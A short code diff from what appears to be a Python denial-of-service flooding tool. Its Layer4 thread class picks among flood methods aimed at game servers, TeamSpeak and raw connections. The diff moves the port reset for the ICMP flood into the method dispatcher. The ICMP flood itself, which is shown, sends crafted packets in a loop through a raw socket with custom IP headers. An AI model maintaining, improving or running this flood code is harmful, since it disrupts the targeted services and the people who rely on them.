@@ -360,7 +360,10 @@ class Layer4(Thread):
         if name == "TS3": self.SENT_FLOOD = self.TS3
         if name == "MCPE": self.SENT_FLOOD = self.MCPE
         if name == "FIVEM": self.SENT_FLOOD = self.FIVEM
-        if name == "ICMP": self.SENT_FLOOD = self.ICMP
+        if name == "ICMP":
+            self.SENT_FLOOD = self.ICMP
+            self._target = (self._target[0], 0)
+
         if name == "MINECRAFT": self.SENT_FLOOD = self.MINECRAFT
         if name == "CPS": self.SENT_FLOOD = self.CPS
         if name == "CONNECTION": self.SENT_FLOOD = self.CONNECTION
@@ -449,7 +452,6 @@ class Layer4(Thread):
     def ICMP(self) -> None:
         payload = self._genrate_icmp()
         s = None
-        self._target = (self._target[0], 0)
         with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
             while Tools.sendto(s, payload, self._target):
